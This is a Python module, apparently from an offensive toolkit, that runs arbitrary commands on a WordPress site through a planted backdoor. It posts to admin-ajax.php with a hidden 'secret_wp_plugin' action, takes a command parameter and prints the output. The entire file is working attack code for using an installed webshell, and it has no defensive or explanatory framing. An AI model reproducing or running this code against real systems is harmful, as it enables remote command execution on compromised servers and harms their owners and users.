'''
name : Exec webshell via admin ajax
description : This module executes commands via a admin ajax webshell in WordPress.
version : 1.0
author : Ayato
'''

import requests

def run_request(ip, cmd, user_agent):
    print(f"[*] Checking evil plugin webshell on {ip}")
    shell_url = f"http://{ip}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": f"{user_agent}"
    }
    data = {
        "action": "secret_wp_plugin",
        "cmd": cmd
    }
    try:
        res = requests.post(
            url=shell_url,
            headers=headers,
            data=data,
            timeout=(6, 6)
        )
        if res.status_code == 200:
            print(f"[+] Webshell is working. Command output: {res.text.strip()}")
            return True
        else:
            print("[-] Webshell did not respond as expected.")
            return False
    except Exception as e:
        print(f"[-] Error checking webshell: {e}")
        return False

def run(ip, user_agent, command):
    print("[*] Running webshell execution module...")
    print(f"[*] Target IP: {ip}")
    ret = run_request(ip, command, user_agent)
    if not ret:
        print("[-] Webshell execution module failed.")
        return -1
    print("[*] Webshell execution module completed.")
    return 0